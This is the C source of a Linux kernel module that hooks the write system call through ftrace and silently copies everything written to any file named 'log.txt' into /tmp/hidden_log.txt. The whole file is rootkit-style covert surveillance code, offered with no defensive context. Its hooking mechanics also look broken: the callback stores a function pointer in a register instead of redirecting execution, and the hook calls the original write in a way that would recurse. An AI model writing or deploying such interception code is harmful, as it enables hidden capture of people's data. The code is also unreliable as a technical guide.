#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/sched.h>
#include <linux/fdtable.h>
#include <linux/kallsyms.h>
#include <linux/ftrace.h>

// Function pointer type for syscall
typedef asmlinkage long (*sys_write_func)(unsigned int, const char __user *, size_t);

// Function prototype
static asmlinkage long custom_write(unsigned int fd, const char __user *buf, size_t count);

// Global variables
static sys_write_func real_sys_write = NULL;
static struct ftrace_ops write_ops;

// Our custom write syscall implementation
static asmlinkage long custom_write(unsigned int fd, const char __user *buf, size_t count)
{
    char *kernel_buf = NULL;
    struct file *file;
    long ret;
    char filename[256];

    // Call original write first
    ret = real_sys_write(fd, buf, count);
    
    // If write failed or count is 0, return
    if (ret <= 0)
        return ret;

    // Get file struct from file descriptor
    file = fget(fd);
    if (!file)
        return ret;

    // Allocate kernel buffer
    kernel_buf = kmalloc(count + 1, GFP_KERNEL);
    if (!kernel_buf) {
        fput(file);
        return ret;
    }

    // Copy user buffer to kernel space
    if (copy_from_user(kernel_buf, buf, count)) {
        kfree(kernel_buf);
        fput(file);
        return ret;
    }
    kernel_buf[count] = '\0';

    // Get file path
    memset(filename, 0, sizeof(filename));
    
    // Safely get file path
    if (file->f_path.dentry && file->f_path.dentry->d_name.name) {
        strncpy(filename, file->f_path.dentry->d_name.name, sizeof(filename) - 1);
    }
    
    // Check if it's log.txt
    if (strstr(filename, "log.txt")) {
        struct file *hidden_file;
        loff_t pos = 0;

        // Open hidden log file with error checking
        hidden_file = filp_open("/tmp/hidden_log.txt", 
                                O_WRONLY | O_CREAT | O_APPEND, 
                                0644);
        
        if (!IS_ERR(hidden_file)) {
            // Write to hidden log with error checking
            kernel_write(hidden_file, kernel_buf, count, &pos);
            filp_close(hidden_file, NULL);
        }
    }

    // Cleanup
    kfree(kernel_buf);
    fput(file);

    return ret;
}

// Ftrace callback
static void notrace ftrace_write_callback(unsigned long ip, unsigned long parent_ip,
                                          struct ftrace_ops *op, struct pt_regs *regs)
{
    // Modify the syscall without disrupting normal execution
    regs->orig_ax = __NR_write;
    regs->ax = (unsigned long)custom_write;
}

static int __init syscall_hook_init(void)
{
    int ret;

    // Lookup the real sys_write
    real_sys_write = (sys_write_func)kallsyms_lookup_name("sys_write");
    if (!real_sys_write) {
        printk(KERN_ERR "Failed to find sys_write\n");
        return -EFAULT;
    }

    // Setup ftrace
    write_ops.func = ftrace_write_callback;
    write_ops.flags = FTRACE_OPS_FL_SAVE_REGS | 
                      FTRACE_OPS_FL_RECURSION_SAFE | 
                      FTRACE_OPS_FL_IPMODIFY;

    // Register ftrace
    ret = ftrace_set_filter_ip(&write_ops, (unsigned long)real_sys_write, 0, 0);
    if (ret) {
        printk(KERN_ERR "Failed to set ftrace filter\n");
        return ret;
    }

    ret = register_ftrace_function(&write_ops);
    if (ret) {
        printk(KERN_ERR "Failed to register ftrace function\n");
        ftrace_set_filter_ip(&write_ops, (unsigned long)real_sys_write, 1, 0);
        return ret;
    }

    printk(KERN_INFO "Write syscall hook installed via ftrace\n");
    return 0;
}

static void __exit syscall_hook_exit(void)
{
    // Unregister ftrace
    unregister_ftrace_function(&write_ops);
    ftrace_set_filter_ip(&write_ops, (unsigned long)real_sys_write, 1, 0);

    printk(KERN_INFO "Write syscall hook removed\n");
}

module_init(syscall_hook_init);
module_exit(syscall_hook_exit);
MODULE_LICENSE("GPL");